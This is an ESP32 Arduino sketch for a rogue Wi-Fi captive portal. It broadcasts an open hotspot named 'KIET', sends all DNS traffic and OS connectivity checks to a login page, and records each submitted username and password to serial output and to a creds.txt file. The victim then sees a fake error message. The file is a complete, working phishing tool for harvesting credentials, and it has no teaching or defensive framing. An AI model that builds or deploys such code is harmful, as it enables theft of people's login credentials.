#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include "SPIFFS.h"

const char* ssid = "KIET";  // Hotspot name
const char* password = "";  // No password

IPAddress localIP(172, 16, 16, 16);        // Desired AP IP
IPAddress gateway(172, 16, 16, 16);
IPAddress subnet(255, 255, 255, 0);

const byte DNS_PORT = 53;
DNSServer dnsServer;
AsyncWebServer server(80);

void setup() {
  Serial.begin(115200);

  // Mount SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS Mount Failed");
    return;
  }

  // Configure AP IP and start AP
  WiFi.softAPConfig(localIP, gateway, subnet);
  WiFi.softAP(ssid, password);
  Serial.println("AP Started: " + String(ssid));
  Serial.print("IP: ");
  Serial.println(WiFi.softAPIP());

  // Start DNS server to redirect all requests to ESP32 IP
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // OS captive portal detection handlers
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){ // Android
    request->redirect("/index.html");
  });
  server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){ // Windows
    request->redirect("/index.html");
  });
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){ // macOS/iOS
    request->redirect("/index.html");
  });

  // Serve static files from SPIFFS
  server.serveStatic("/", SPIFFS, "/").setDefaultFile("index.html");

  // Handle login form submissions
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
    String username, password;
    if (request->hasParam("username", true)) {
      username = request->getParam("username", true)->value();
    }
    if (request->hasParam("password", true)) {
      password = request->getParam("password", true)->value();
    }

    Serial.println("===== Captured Credentials =====");
    Serial.println("Username: " + username);
    Serial.println("Password: " + password);
    Serial.println("================================");

    // Save to SPIFFS
    File file = SPIFFS.open("/creds.txt", FILE_APPEND);
    if (file) {
      file.println("Username: " + username + " | Password: " + password);
      file.close();
    }

    request->send(200, "text/html", "<h2>Error! Please try again after some time.</h2>");
  });

  // Redirect manual access (including 172.16.16.16) to captive portal
  server.onNotFound([](AsyncWebServerRequest *request){
    request->redirect("/index.html");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
}
